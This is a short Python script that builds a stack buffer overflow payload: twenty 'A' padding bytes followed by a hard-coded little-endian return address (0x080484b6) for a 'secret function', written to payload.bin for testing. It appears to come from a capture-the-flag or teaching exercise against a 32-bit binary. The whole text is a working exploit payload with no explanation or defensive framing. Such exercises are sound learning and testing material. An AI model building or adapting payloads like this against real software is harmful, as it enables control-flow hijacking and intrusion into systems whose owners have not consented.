padding = b"A" * 20
address_of_secret_function = b"\xb6\x84\x04\x08"  # 0x080484b6 in little-endian format
payload = padding + address_of_secret_function

# Save the payload to a file for testing
with open("payload.bin", "wb") as f:
    f.write(payload)
